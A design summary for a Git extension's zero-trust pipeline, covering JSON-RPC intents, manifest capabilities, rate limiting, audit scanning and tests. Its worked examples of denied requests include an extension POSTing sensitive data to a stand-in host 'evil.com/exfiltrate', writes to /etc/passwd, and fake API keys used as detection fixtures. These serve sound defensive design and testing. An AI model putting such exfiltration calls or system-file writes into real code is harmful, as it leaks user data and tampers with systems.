# SPRINT5_SUMMARY.md - Git Extension Architecture

**Sprint Focus**: Git Extension Architecture, JSON-RPC Intent System, Zero Trust Enforcement, and Pipeline Integration

## Table of Contents

1. [Extension Package Structure](#extension-package-structure)
2. [JSON-RPC Intent Emission Patterns](#json-rpc-intent-emission-patterns)
3. [Manifest Capability Declarations](#manifest-capability-declarations)
4. [Zero Trust Enforcement](#zero-trust-enforcement)
5. [Pipeline Integration](#pipeline-integration)
6. [Testing Strategy](#testing-strategy)
7. [Extension Developer Quickstart](#extension-developer-quickstart)

---

## Extension Package Structure

The Ghost Git Extension demonstrates the canonical architecture for building Ghost extensions with proper separation of concerns and RPC-based communication.

### Package Architecture Diagram

```
┌─────────────────────────────────────────────────────────────────┐
│                     GHOST GIT EXTENSION                         │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │               manifest.json                               │ │
│  │  • Extension metadata (id, name, version)                 │ │
│  │  • Capability declarations (filesystem, network, git)     │ │
│  │  • Rate limit configuration (CIR/Bc/Be)                   │ │
│  │  • Hook registrations (pre-commit, commit-msg, pre-push)  │ │
│  └───────────────────────────────────────────────────────────┘ │
│                           ↓                                     │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │            ExtensionRPCClient (extension.js)              │ │
│  │  • JSON-RPC 2.0 message construction                      │ │
│  │  • Intent emission API (filesystem, network, git)         │ │
│  │  • Request/response handling                              │ │
│  │  • Error handling and retries                             │ │
│  └───────────────────────────────────────────────────────────┘ │
│                           ↓                                     │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │              GitExtension Logic (extension.js)            │ │
│  │  • AI-powered commit generation                           │ │
│  │  • Security scanning (secrets detection)                  │ │
│  │  • Version management (semver bumping)                    │ │
│  │  • Merge conflict resolution                              │ │
│  │  • Hook implementation (pre-commit, etc.)                 │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
                              ↓
                    JSON-RPC Intents (IPC)
                              ↓
┌─────────────────────────────────────────────────────────────────┐
│                    GHOST CORE PIPELINE                          │
├─────────────────────────────────────────────────────────────────┤
│  Intercept → Authorization → Audit → Execution                 │
└─────────────────────────────────────────────────────────────────┘
```

### Component Breakdown

#### 1. **manifest.json** - Capability Contract
- **Purpose**: Declares all capabilities required by the extension (fail-closed security model)
- **Location**: `extensions/ghost-git-extension/manifest.json`
- **Key Sections**:
  - `capabilities.filesystem`: Read/write path patterns (glob-based)
  - `capabilities.network`: URL allowlist + rate limits (CIR/Bc/Be)
  - `capabilities.git`: Read/write permissions
  - `capabilities.hooks`: Git hook registrations

#### 2. **ExtensionRPCClient** - Communication Layer
- **Purpose**: Encapsulates JSON-RPC 2.0 protocol for talking to Ghost core
- **Location**: `extensions/ghost-git-extension/extension.js` (lines 11-135)
- **Responsibilities**:
  - Constructs JSON-RPC 2.0 messages (`{ jsonrpc: "2.0", id, method, params }`)
  - Emits intents to Ghost pipeline (`emitIntent(type, operation, params)`)
  - Handles responses and errors
  - Provides high-level convenience methods (`requestFileRead`, `requestGitExec`, etc.)

#### 3. **GitExtension** - Business Logic
- **Purpose**: Implements Git-specific functionality using the RPC client
- **Location**: `extensions/ghost-git-extension/extension.js` (lines 137-1154)
- **Responsibilities**:
  - AI commit generation (callAI, generateCommit)
  - Security scanning (scanForSecrets, auditSecurity)
  - Version management (handleVersionBump, semverBump)
  - Merge resolution (handleMergeResolve)
  - Hook handlers (via handleRPCRequest dispatch)

---

## JSON-RPC Intent Emission Patterns

All extension I/O operations use the **Intent Schema** to communicate with the Ghost pipeline via JSON-RPC 2.0.

### Intent Structure

```javascript
{
    type: 'filesystem' | 'network' | 'git' | 'process',
    operation: string,        // Type-specific operation
    params: object,           // Operation parameters
    extensionId: string,      // Extension identifier
    requestId: string         // Unique request ID
}
```

### Pattern 1: Filesystem Operations

#### Read File
```javascript
// In GitExtension
async requestFileRead(path, encoding = 'utf8') {
    return await this.emitIntent('filesystem', 'read', { path, encoding });
}

// Intent emitted:
{
    type: 'filesystem',
    operation: 'read',
    params: { path: './package.json', encoding: 'utf8' },
    extensionId: 'ghost-git-extension',
    requestId: 'ghost-git-extension-1234567890-abc123'
}

// Response:
{
    success: true,
    result: "{ \"name\": \"ghost-cli\", ... }",
    requestId: 'ghost-git-extension-1234567890-abc123'
}
```

#### Write File
```javascript
// In GitExtension
async requestFileWrite(path, content, encoding = 'utf8') {
    return await this.emitIntent('filesystem', 'write', { path, content, encoding });
}

// Intent emitted:
{
    type: 'filesystem',
    operation: 'write',
    params: { 
        path: './.ghost-versionrc', 
        content: '{"versionFiles":[...]}',
        encoding: 'utf8'
    },
    extensionId: 'ghost-git-extension'
}
```

#### Directory Listing
```javascript
// In GitExtension (used in performFullAudit)
async requestFileReadDir(path, options = {}) {
    return await this.emitIntent('filesystem', 'readdir', { path, ...options });
}

// Intent:
{
    type: 'filesystem',
    operation: 'readdir',
    params: { path: process.cwd(), recursive: true },
    extensionId: 'ghost-git-extension'
}

// Response:
{
    success: true,
    result: ['src/index.js', 'package.json', 'README.md', ...]
}
```

### Pattern 2: Network Operations

#### HTTPS API Call (AI Providers)
```javascript
// In GitExtension.callAI
async requestNetworkCall(options, payload) {
    return await this.emitIntent('network', 'request', { options, payload });
}

// Example: Groq API call
const options = {
    hostname: 'api.groq.com',
    path: '/openai/v1/chat/completions',
    method: 'POST',
    headers: {
        'Authorization': 'Bearer gsk_...',
        'Content-Type': 'application/json'
    }
};

const payload = {
    model: 'llama-3.3-70b-versatile',
    messages: [
        { role: 'system', content: 'You are a Git commit expert.' },
        { role: 'user', content: 'Generate commit message for:\n...' }
    ],
    temperature: 0.3
};

// Intent:
{
    type: 'network',
    operation: 'request',
    params: { options, payload },
    extensionId: 'ghost-git-extension'
}

// Response (after rate limit + authorization checks):
{
    success: true,
    result: '{"choices":[{"message":{"content":"feat: add user authentication"}}]}',
    warnings: []
}
```

### Pattern 3: Git Operations

#### Git Execution
```javascript
// In GitExtension
async requestGitExec(args, suppressError = false) {
    return await this.emitIntent('git', 'exec', { args, suppressError });
}

// Example: Get staged diff
await this.rpc.gitExec(['diff', '--cached', '--name-only']);

// Intent:
{
    type: 'git',
    operation: 'exec',
    params: { 
        args: ['diff', '--cached', '--name-only'],
        suppressError: false
    },
    extensionId: 'ghost-git-extension'
}

// Response:
{
    success: true,
    result: "src/index.js\npackage.json\n"
}
```

#### Git Write Operations (Commit, Tag)
```javascript
// Create version tag
await this.rpc.gitExec(['tag', '-a', 'v1.2.3', '-m', 'Release v1.2.3']);

// Intent (requires git:write capability):
{
    type: 'git',
    operation: 'exec',
    params: { args: ['tag', '-a', 'v1.2.3', '-m', 'Release v1.2.3'] },
    extensionId: 'ghost-git-extension'
}
```

### Pattern 4: Batch Operations (Optimization)

```javascript
// Sequential filesystem reads (used in version bump)
const headText = await this.rpc.gitExec(['show', `HEAD:package.json`]);
const indexText = await this.rpc.gitExec(['show', `:package.json`]);

// These could be batched in future optimizations:
// const batch = [
//     { type: 'git', operation: 'exec', params: { args: ['show', 'HEAD:package.json'] }},
//     { type: 'git', operation: 'exec', params: { args: ['show', ':package.json'] }}
// ];
```

---

## Manifest Capability Declarations

The `manifest.json` defines the complete security boundary for the extension. All capabilities follow a **fail-closed** model: undeclared operations are denied.

### Full Git Extension Manifest

```json
{
  "id": "ghost-git-extension",
  "name": "Ghost Git Extension",
  "version": "1.0.0",
  "description": "Git operations extension for Ghost CLI with AI-powered commit generation, security scanning, version management, and merge resolution",
  "main": "index.js",
  "capabilities": {
    "filesystem": {
      "read": ["**/*"],
      "write": [
        ".git/**",
        "package.json",
        ".ghost-versionrc",
        ".ghostignore",
        ".ghostrc",
        "~/.ghost*",
        "~/.ghost/audit.log"
      ]
    },
    "network": {
      "allowlist": [
        "https://api.groq.com",
        "https://api.openai.com",
        "https://api.anthropic.com",
        "https://generativelanguage.googleapis.com"
      ],
      "rateLimit": {
        "cir": 100000,
        "bc": 500000,
        "be": 1000000
      }
    },
    "git": {
      "read": true,
      "write": true
    },
    "hooks": ["pre-commit", "commit-msg", "pre-push"]
  },
  "permissions": [
    "filesystem:read",
    "filesystem:write",
    "network:https",
    "git:read",
    "git:write",
    "process:spawn"
  ]
}
```

### Rate Limit Configuration Rationale

The Git extension uses **Two-Rate Three-Color Marker (trTCM RFC 2698)** for traffic policing with byte-based rate limiting:

#### CIR (Committed Information Rate): 100,000 bytes/min
**Rationale**:
- Typical AI API request: 2-10KB prompt
- Typical AI API response: 5-50KB
- Normal operation: 5-10 AI requests/min
- Sustained bandwidth: 50-500KB/min
- **Setting**: 100KB/min provides comfortable headroom for sustained operations

#### Bc (Burst Committed): 500,000 bytes
**Rationale**:
- **5x CIR** allows significant bursting
- Accommodates burst scenarios:
  - Initial project analysis (multiple files scanned)
  - Batch commit generation (analyzing large diffs)
  - Large repository diff processing
- Example burst: 5-10 requests in quick succession before returning to sustained rate
- **Setting**: 500KB committed burst capacity

#### Be (Burst Excess): 1,000,000 bytes
**Rationale**:
- **2x Bc** provides exceptional spike tolerance
- Handles edge cases:
  - Large repository diffs (100KB+)
  - Comprehensive merge conflict AI analysis
  - Verbose AI responses during complex operations
- Provides headroom for AI response variability without red-dropping legitimate traffic
- **Setting**: 1MB excess burst capacity

#### Traffic Color Classification
- **Green**: Within CIR, consumes Bc tokens → Always allowed
- **Yellow**: Exceeds CIR but within Be → Allowed during bursts
- **Red**: Exceeds Bc + Be → Rejected with `RATE_LIMIT_EXCEEDED`

### Filesystem Capability Patterns

```javascript
// Read capability: Universal read access
"read": ["**/*"]

// Write capability: Narrowly scoped to Git/config files
"write": [
    ".git/**",              // Git repository modifications
    "package.json",         // Version bumping
    ".ghost-versionrc",     // Version config
    ".ghostignore",         // Security exceptions
    ".ghostrc",             // User config
    "~/.ghost*",            // Global Ghost config
    "~/.ghost/audit.log"    // Audit logging
]
```

**Security Principle**: Read broadly (for inspection), write narrowly (for specific use cases).

### Network Capability Allowlist

```javascript
"allowlist": [
    "https://api.groq.com",                          // Groq LLM
    "https://api.openai.com",                        // OpenAI GPT
    "https://api.anthropic.com",                     // Anthropic Claude
    "https://generativelanguage.googleapis.com"      // Google Gemini
]
```

**Enforcement**: Authorization layer validates hostname exact match before allowing requests.

### Git Capability Flags

```javascript
"git": {
    "read": true,   // Allow: status, log, diff, show, ls-files
    "write": true   // Allow: commit, tag, push, reset, checkout, merge
}
```

**Authorization Logic** (see `core/pipeline/auth.js`):
- Read operations: `status`, `log`, `diff`, `show`, `branch --list`, `tag --list`
- Write operations: `commit`, `add`, `tag -a`, `push`, `reset`, `checkout`, `merge`

---

## Zero Trust Enforcement

The Ghost pipeline implements **Zero Trust** at every layer. All operations are validated, authorized, and audited before execution.

### Enforcement Flow

```
Extension Intent → Intercept → Authorization → Audit → Execution
                       ↓            ↓            ↓         ↓
                   Validate     Check Perms   Log      Execute
                   Schema       Rate Limit    Scan     w/ Safety
```

### Example 1: Authorized Filesystem Read

```javascript
// Extension code
const content = await this.rpc.requestFileRead('package.json');

// Intent emitted:
{
    type: 'filesystem',
    operation: 'read',
    params: { path: 'package.json' },
    extensionId: 'ghost-git-extension'
}

// INTERCEPT LAYER: Schema validation
✓ Valid type: 'filesystem'
✓ Valid operation: 'read'
✓ Required params present: { path }

// AUTHORIZATION LAYER: Permission check
✓ Extension registered
✓ Capability declared: filesystem.read = ["**/*"]
✓ Path matches glob: "package.json" matches "**/*"
✓ Permission granted: filesystem:read

// AUDIT LAYER: Security scanning
✓ No high-entropy strings detected
✓ No NIST 800-53 violations
✓ Logged: READ_OPERATION (severity: info)

// EXECUTION LAYER: Safe execution
✓ File read with timeout
✓ Result: "{ \"name\": \"ghost-cli\", ... }"

// Response:
{
    success: true,
    result: "{ \"name\": \"ghost-cli\", ... }",
    requestId: "ghost-git-extension-123-abc"
}
```

### Example 2: Blocked Filesystem Write (Path Violation)

```javascript
// Extension code (attempting unauthorized write)
await this.rpc.requestFileWrite('/etc/passwd', 'malicious');

// Intent:
{
    type: 'filesystem',
    operation: 'write',
    params: { path: '/etc/passwd', content: 'malicious' },
    extensionId: 'ghost-git-extension'
}

// INTERCEPT LAYER: ✓ Schema valid

// AUTHORIZATION LAYER: Path check
✗ Path "/etc/passwd" does NOT match any write patterns:
  - .git/**
  - package.json
  - .ghost-versionrc
  - (etc.)

✗ PERMISSION DENIED

// AUDIT LAYER: Security event logged
{
    timestamp: "2024-01-15T10:30:00Z",
    type: "AUTHORIZATION_DENIED",
    extensionId: "ghost-git-extension",
    severity: "high",
    reason: "Path not allowed: /etc/passwd",
    code: "PATH_NOT_ALLOWED"
}

// Response (execution never reached):
{
    success: false,
    stage: 'AUTHORIZATION',
    error: 'Path not allowed: /etc/passwd',
    code: 'PATH_NOT_ALLOWED',
    requestId: "ghost-git-extension-123-abc"
}
```

### Example 3: Blocked Network Request (URL Not Allowlisted)

```javascript
// Extension code (attempting unauthorized network call)
await this.rpc.httpsRequest({
    hostname: 'evil.com',
    path: '/exfiltrate',
    method: 'POST'
}, { data: 'sensitive' });

// Intent:
{
    type: 'network',
    operation: 'request',
    params: { 
        options: { hostname: 'evil.com', path: '/exfiltrate', method: 'POST' },
        payload: { data: 'sensitive' }
    },
    extensionId: 'ghost-git-extension'
}

// INTERCEPT LAYER: ✓ Schema valid

// AUTHORIZATION LAYER: URL allowlist check
Allowlist:
  - https://api.groq.com
  - https://api.openai.com
  - https://api.anthropic.com
  - https://generativelanguage.googleapis.com

✗ "evil.com" NOT in allowlist

✗ PERMISSION DENIED

// AUDIT LAYER: Security alert
{
    timestamp: "2024-01-15T10:30:00Z",
    type: "SECURITY_ALERT",
    extensionId: "ghost-git-extension",
    severity: "critical",
    rule: "NETWORK_ALLOWLIST",
    message: "Blocked unauthorized network request to evil.com"
}

// Response:
{
    success: false,
    stage: 'AUTHORIZATION',
    error: 'URL not allowed: evil.com',
    code: 'URL_NOT_ALLOWED'
}
```

### Example 4: Rate Limited (Exceeds Bc + Be)

```javascript
// Extension rapidly making AI requests
for (let i = 0; i < 100; i++) {
    await this.rpc.httpsRequest(groqOptions, largePayload);  // 20KB each
}

// After ~75 requests (1.5MB total):

// AUTHORIZATION LAYER: Rate limit check
TrafficPolicer state:
  - Bc bucket: 0 tokens (depleted)
  - Be bucket: 0 tokens (depleted)
  - Total consumed: 1,500,000 bytes

✗ RATE LIMIT EXCEEDED (red packet)

// AUDIT LAYER: Rate limit violation
{
    timestamp: "2024-01-15T10:30:15Z",
    type: "RATE_LIMIT_EXCEEDED",
    extensionId: "ghost-git-extension",
    severity: "high",
    details: {
        bytesRequested: 20000,
        bcAvailable: 0,
        beAvailable: 0,
        totalConsumed: 1500000
    }
}

// Response:
{
    success: false,
    stage: 'AUTHORIZATION',
    error: 'Rate limit exceeded',
    code: 'RATE_LIMIT_EXCEEDED',
    state: {
        bc: { available: 0, capacity: 500000 },
        be: { available: 0, capacity: 1000000 }
    }
}
```

### Example 5: Audit Layer Blocking (Secret Detection)

```javascript
// Extension attempting to write API key
await this.rpc.requestFileWrite('config.js', `
    const API_KEY = "gsk_1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKL";
`);

// INTERCEPT LAYER: ✓ Valid
// AUTHORIZATION LAYER: ✓ Path allowed (config.js matches **/*)

// AUDIT LAYER: Content scanning
EntropyValidator.scan(content):
  - Pattern match: "gsk_[a-zA-Z0-9]{48,}" → DETECTED
  - Type: Groq API Key
  - Severity: CRITICAL

NIST SI-10 Compliance check:
  - Input validation: FAILED
  - Reason: High-risk secret pattern detected
  - Recommendation: Remove secret, use environment variables

✗ AUDIT FAILED

// AUDIT LAYER: Security alert
{
    timestamp: "2024-01-15T10:30:00Z",
    type: "SECURITY_ALERT",
    extensionId: "ghost-git-extension",
    severity: "critical",
    rule: "SECRET_DETECTION",
    violations: [
        {
            type: "Groq API Key",
            pattern: "gsk_...",
            severity: "critical"
        }
    ]
}

// Response (execution blocked):
{
    success: false,
    stage: 'AUDIT',
    error: 'Security violation: Groq API Key detected in content',
    code: 'AUDIT_FAILED',
    violations: [...]
}
```

---

## Pipeline Integration

The Git extension integrates with the Ghost core through the 4-layer pipeline architecture.

### Architecture Overview

```
┌──────────────────────────────────────────────────────────────┐
│                    GHOST CORE RUNTIME                        │
├──────────────────────────────────────────────────────────────┤
│  ┌────────────────┐      ┌────────────────┐                 │
│  │    Gateway     │ ───> │ ExtensionLoader│                 │
│  │  - Discovery   │      │  - Validation  │                 │
│  │  - Registry    │      │  - Loading     │                 │
│  └────────────────┘      └────────────────┘                 │
└──────────────────────────────────────────────────────────────┘
                             ↓
          Extension Instance Created (GitExtension)
                             ↓
┌──────────────────────────────────────────────────────────────┐
│                  4-LAYER I/O PIPELINE                        │
├──────────────────────────────────────────────────────────────┤
│                                                              │
│  1. INTERCEPT LAYER (core/pipeline/intercept.js)            │
│     ┌────────────────────────────────────────────────┐      │
│     │ MessageInterceptor                             │      │
│     │  • JSON-RPC 2.0 validation                     │      │
│     │  • Intent schema validation                    │      │
│     │  • Message deserialization                     │      │
│     │                                                │      │
│     │  Validates:                                    │      │
│     │   - jsonrpc === "2.0"                          │      │
│     │   - id present and valid type                  │      │
│     │   - method is non-empty string                 │      │
│     │   - params is object                           │      │
│     │                                                │      │
│     │  Intent Validation (IntentSchema):             │      │
│     │   - type in [filesystem, network, git, process]│      │
│     │   - operation valid for type                   │      │
│     │   - params contains required fields            │      │
│     │   - extensionId present                        │      │
│     └────────────────────────────────────────────────┘      │
│                        ↓ (Intent object)                     │
│                                                              │
│  2. AUTHORIZATION LAYER (core/pipeline/auth.js)             │
│     ┌────────────────────────────────────────────────┐      │
│     │ AuthorizationLayer                             │      │
│     │  • Extension registry lookup                   │      │
│     │  • Capability validation                       │      │
│     │  • Path/URL pattern matching                   │      │
│     │  • Rate limit enforcement (trTCM)              │      │
│     │                                                │      │
│     │  PermissionChecker:                            │      │
│     │   - Filesystem: GlobMatcher.match(path, pattern)│     │
│     │   - Network: URL in allowlist                  │      │
│     │   - Git: read/write flag check                 │      │
│     │                                                │      │
│     │  TrafficPolicer (Two-Rate Three-Color):        │      │
│     │   - Bc bucket (committed burst)                │      │
│     │   - Be bucket (excess burst)                   │      │
│     │   - Token consumption (byte-based)             │      │
│     │   - Color marking: Green → Yellow → Red        │      │
│     └────────────────────────────────────────────────┘      │
│                        ↓ (Authorized)                        │
│                                                              │
│  3. AUDIT LAYER (core/pipeline/audit.js)                    │
│     ┌────────────────────────────────────────────────┐      │
│     │ AuditLayer                                     │      │
│     │  • Content security scanning                   │      │
│     │  • NIST 800-53 compliance validation           │      │
│     │  • Entropy analysis (secrets detection)        │      │
│     │  • Audit logging (JSON structured logs)        │      │
│     │                                                │      │
│     │  EntropyValidator (core/validators):           │      │
│     │   - Shannon entropy calculation                │      │
│     │   - Regex pattern matching (API keys, tokens)  │      │
│     │   - Known non-secret filtering                 │      │
│     │   - Severity classification                    │      │
│     │                                                │      │
│     │  AuditLogger:                                  │      │
│     │   - Structured JSON logs                       │      │
│     │   - Severity levels (info, warn, error, critical)│    │
│     │   - Event types (READ, WRITE, NETWORK, etc.)   │      │
│     │   - Violation details                          │      │
│     └────────────────────────────────────────────────┘      │
│                        ↓ (Audited)                           │
│                                                              │
│  4. EXECUTION LAYER (core/pipeline/execute.js)              │
│     ┌────────────────────────────────────────────────┐      │
│     │ ExecutionLayer                                 │      │
│     │  • Safe operation execution                    │      │
│     │  • Circuit breaker pattern                     │      │
│     │  • Timeout management                          │      │
│     │  • Resource cleanup                            │      │
│     │                                                │      │
│     │  CircuitBreaker:                               │      │
│     │   - States: CLOSED, OPEN, HALF_OPEN            │      │
│     │   - Failure threshold tracking                 │      │
│     │   - Automatic recovery                         │      │
│     │                                                │      │
│     │  Executors:                                    │      │
│     │   - FilesystemExecutor (fs operations)         │      │
│     │   - NetworkExecutor (https requests)           │      │
│     │   - GitExecutor (child_process git commands)   │      │
│     │   - ProcessExecutor (spawn/exec)               │      │
│     └────────────────────────────────────────────────┘      │
│                        ↓ (Result)                            │
│                                                              │
└──────────────────────────────────────────────────────────────┘
                             ↓
                    Response to Extension
                    { success, result, requestId }
```

### Layer-by-Layer Integration

#### Layer 1: Intercept
**File**: `core/pipeline/intercept.js`

**Git Extension Integration**:
```javascript
// Extension sends JSON-RPC message
const message = {
    jsonrpc: '2.0',
    id: 'req-123',
    method: 'intent',
    params: {
        type: 'filesystem',
        operation: 'read',
        params: { path: 'package.json' },
        extensionId: 'ghost-git-extension'
    }
};

// Interceptor validates and creates Intent
const interceptor = new MessageInterceptor();
const intent = interceptor.intercept(message);

// Intent object (immutable, frozen):
{
    type: 'filesystem',
    operation: 'read',
    params: { path: 'package.json' },
    extensionId: 'ghost-git-extension',
    timestamp: 1705320000000,
    requestId: 'ghost-git-extension-1705320000000-abc123'
}
```

#### Layer 2: Authorization
**File**: `core/pipeline/auth.js`

**Git Extension Integration**:
```javascript
const authLayer = new AuthorizationLayer();

// Register extension capabilities from manifest
authLayer.registerExtension('ghost-git-extension', {
    capabilities: {
        filesystem: {
            read: ['**/*'],
            write: ['.git/**', 'package.json', ...]
        },
        network: {
            allowlist: ['https://api.groq.com', ...],
            rateLimit: { cir: 100000, bc: 500000, be: 1000000 }
        },
        git: { read: true, write: true }
    }
});

// Authorize intent
const authResult = authLayer.authorize(intent);

// For filesystem read of package.json:
{
    authorized: true,
    reason: null,
    code: null
}

// For unauthorized path (e.g., /etc/passwd):
{
    authorized: false,
    reason: 'Path not allowed: /etc/passwd',
    code: 'PATH_NOT_ALLOWED'
}
```

**Rate Limiting Integration**:
```javascript
// Network request authorization includes rate limit check
const trafficPolicer = new TrafficPolicer(100000, 500000, 1000000);

// Check rate limit (byte-based)
const requestSize = Buffer.byteLength(JSON.stringify(payload));
const result = trafficPolicer.tryConsume(requestSize);

if (result.color === 'RED') {
    return {
        authorized: false,
        reason: 'Rate limit exceeded',
        code: 'RATE_LIMIT_EXCEEDED',
        state: trafficPolicer.getState()
    };
}
```

#### Layer 3: Audit
**File**: `core/pipeline/audit.js`

**Git Extension Integration**:
```javascript
const auditLayer = new AuditLayer('~/.ghost/audit.log', manifestCapabilities);

// Audit intent before execution
const auditResult = auditLayer.audit(intent, authResult);

// For safe content:
{
    passed: true,
    reason: null,
    warnings: []
}

// For content with secrets:
{
    passed: false,
    reason: 'Security violation: API key detected',
    code: 'AUDIT_FAILED',
    violations: [
        { type: 'Groq API Key', severity: 'critical', pattern: 'gsk_...' }
    ]
}

// Audit log entry (JSON):
{
    "timestamp": "2024-01-15T10:30:00.000Z",
    "type": "FILESYSTEM_READ",
    "extensionId": "ghost-git-extension",
    "severity": "info",
    "operation": "read",
    "path": "package.json",
    "requestId": "ghost-git-extension-123-abc"
}
```

#### Layer 4: Execution
**File**: `core/pipeline/execute.js`

**Git Extension Integration**:
```javascript
const executionLayer = new ExecutionLayer();

// Execute intent with safety mechanisms
const result = await executionLayer.execute(intent);

// FilesystemExecutor example:
switch (intent.operation) {
    case 'read':
        return fs.promises.readFile(intent.params.path, {
            encoding: intent.params.encoding || 'utf8'
        });
    
    case 'write':
        return fs.promises.writeFile(
            intent.params.path,
            intent.params.content,
            { encoding: intent.params.encoding || 'utf8' }
        );
}

// GitExecutor example (uses child_process):
const gitArgs = intent.params.args;
const proc = spawn('git', gitArgs, { cwd: process.cwd() });
return await collectOutput(proc);

// Circuit breaker integration:
if (circuitBreaker.state === 'OPEN') {
    throw new ExecutionError('Circuit breaker open', 'CIRCUIT_BREAKER_OPEN');
}

try {
    const result = await executeWithTimeout(operation, timeout);
    circuitBreaker.recordSuccess();
    return result;
} catch (error) {
    circuitBreaker.recordFailure();
    throw error;
}
```

### End-to-End Request Flow Example

**Scenario**: Git extension reads staged diff for commit generation

```javascript
// 1. Extension code (GitExtension.getStagedDiff)
const filesOutput = await this.rpc.gitExec(['diff', '--cached', '--name-only']);

// 2. RPC Client emits intent
{
    type: 'git',
    operation: 'exec',
    params: { args: ['diff', '--cached', '--name-only'] },
    extensionId: 'ghost-git-extension',
    requestId: 'ghost-git-extension-1705320000-xyz'
}

// 3. INTERCEPT: Validate JSON-RPC + Intent schema
✓ Valid JSON-RPC 2.0
✓ Valid Intent (type: git, operation: exec)

// 4. AUTHORIZATION: Check git:read capability
✓ Extension registered
✓ Capability declared: git.read = true
✓ Operation allowed (read-only)

// 5. AUDIT: Security scan
✓ No security violations
✓ Logged: GIT_EXEC operation

// 6. EXECUTION: Run git command
const proc = spawn('git', ['diff', '--cached', '--name-only']);
const output = "src/index.js\npackage.json\n";

// 7. Response to extension
{
    success: true,
    result: "src/index.js\npackage.json\n",
    requestId: 'ghost-git-extension-1705320000-xyz'
}

// 8. Extension continues processing
const files = filesOutput.split('\n').filter(f => f.trim());
// => ['src/index.js', 'package.json']
```

---

## Testing Strategy

Comprehensive testing ensures manifest enforcement and rate limiting work correctly across all pipeline layers.

### Test Categories

#### 1. Unit Tests (Individual Layers)

**Intercept Layer Tests** (`test/intercept.test.js`):
```javascript
// Test JSON-RPC 2.0 validation
assert.throws(() => {
    interceptor.deserialize({ method: 'test' });  // Missing jsonrpc
}, /jsonrpc/);

// Test Intent schema validation
const validIntent = {
    type: 'filesystem',
    operation: 'read',
    params: { path: 'test.txt' },
    extensionId: 'test-ext'
};
const intent = new Intent(validIntent);
assert.strictEqual(intent.type, 'filesystem');
```

**Authorization Layer Tests** (`test/auth.test.js`):
```javascript
// Test filesystem path matching
const authLayer = new AuthorizationLayer();
authLayer.registerExtension('test-ext', {
    capabilities: {
        filesystem: {
            read: ['src/**/*.js'],
            write: ['dist/**']
        }
    }
});

// Should allow
const readIntent = new Intent({
    type: 'filesystem',
    operation: 'read',
    params: { path: 'src/index.js' },
    extensionId: 'test-ext'
});
assert.strictEqual(authLayer.authorize(readIntent).authorized, true);

// Should deny
const writeIntent = new Intent({
    type: 'filesystem',
    operation: 'write',
    params: { path: '/etc/passwd', content: 'bad' },
    extensionId: 'test-ext'
});
assert.strictEqual(authLayer.authorize(writeIntent).authorized, false);
```

**Rate Limit Tests** (`test/token-bucket.test.js`):
```javascript
// Test trTCM token bucket
const policer = new TrafficPolicer(
    100000,  // CIR: 100KB/min
    500000,  // Bc: 500KB
    1000000  // Be: 1MB
);

// Green traffic (within Bc)
let result = policer.tryConsume(50000);
assert.strictEqual(result.color, 'GREEN');

// Yellow traffic (exceeds Bc, uses Be)
result = policer.tryConsume(600000);
assert.strictEqual(result.color, 'YELLOW');

// Red traffic (exceeds Bc + Be)
result = policer.tryConsume(500000);
assert.strictEqual(result.color, 'RED');
assert.strictEqual(result.allowed, false);
```

**Audit Layer Tests** (`test/audit.test.js`):
```javascript
// Test secret detection
const auditLayer = new AuditLayer('/tmp/audit.log');

const intentWithSecret = new Intent({
    type: 'filesystem',
    operation: 'write',
    params: { 
        path: 'config.js', 
        content: 'const KEY = "gsk_1234567890abcdefghijklmnopqrstuvwxyz";'
    },
    extensionId: 'test-ext'
});

const result = auditLayer.audit(intentWithSecret, { authorized: true });
assert.strictEqual(result.passed, false);
assert.ok(result.violations.some(v => v.type.includes('Groq API Key')));
```

#### 2. Integration Tests (Multi-Layer)

**Pipeline Integration Tests** (`test/pipeline.test.js`):
```javascript
// Test full pipeline flow
const pipeline = new IOPipeline({ auditLogPath: '/tmp/audit.log' });

pipeline.registerExtension('test-ext', {
    capabilities: {
        filesystem: { read: ['**/*.txt'], write: [] }
    }
});

// Test authorized read
const readMessage = {
    jsonrpc: '2.0',
    id: '1',
    method: 'intent',
    params: {
        type: 'filesystem',
        operation: 'read',
        params: { path: 'test.txt' },
        extensionId: 'test-ext'
    }
};

const response = await pipeline.process(readMessage);
assert.strictEqual(response.success, true);

// Test unauthorized write
const writeMessage = {
    jsonrpc: '2.0',
    id: '2',
    method: 'intent',
    params: {
        type: 'filesystem',
        operation: 'write',
        params: { path: 'test.txt', content: 'data' },
        extensionId: 'test-ext'
    }
};

const deniedResponse = await pipeline.process(writeMessage);
assert.strictEqual(deniedResponse.success, false);
assert.strictEqual(deniedResponse.code, 'PATH_NOT_ALLOWED');
```

**QoS + Audit Integration** (`test/qos-audit-integration.test.js`):
```javascript
// Test rate limiting triggers audit logging
const pipeline = new IOPipeline({ auditLogPath: '/tmp/qos-audit.log' });

pipeline.registerExtension('rate-test', {
    capabilities: {
        network: {
            allowlist: ['https://api.example.com'],
            rateLimit: { cir: 1000, bc: 2000, be: 0 }
        }
    }
});

// Exhaust rate limit
for (let i = 0; i < 10; i++) {
    await pipeline.process({
        jsonrpc: '2.0',
        id: `${i}`,
        method: 'intent',
        params: {
            type: 'network',
            operation: 'request',
            params: { 
                options: { hostname: 'api.example.com', path: '/', method: 'GET' },
                payload: 'x'.repeat(300)  // 300 bytes
            },
            extensionId: 'rate-test'
        }
    });
}

// Verify audit log contains RATE_LIMIT_EXCEEDED
const logs = pipeline.getAuditLogs({ type: 'RATE_LIMIT_EXCEEDED' });
assert.ok(logs.length > 0);
```

#### 3. Extension-Specific Tests

**Git Extension Tests** (`test/extensions/git-extension.test.js`):
```javascript
// Test version bump capability
const ext = createExtension(mockCoreHandler);

const result = await ext.extension.handleRPCRequest({
    jsonrpc: '2.0',
    id: '1',
    method: 'git.version.bump',
    params: { bumpType: 'patch', flags: { dryRun: true } }
});

assert.strictEqual(result.result.dryRun, true);
assert.ok(result.result.nextVersion);

// Test security scanning
const mockDiff = {
    'test.js': 'const key = "gsk_test1234567890abcdefghijklmnop";'
};

const auditResult = await ext.extension.auditSecurity(
    mockDiff,
    'groq',
    'test-key',
    'llama-3.3-70b-versatile'
);

assert.strictEqual(auditResult.blocked, true);
assert.ok(auditResult.reason.includes('secret'));
```

### Test Coverage Targets

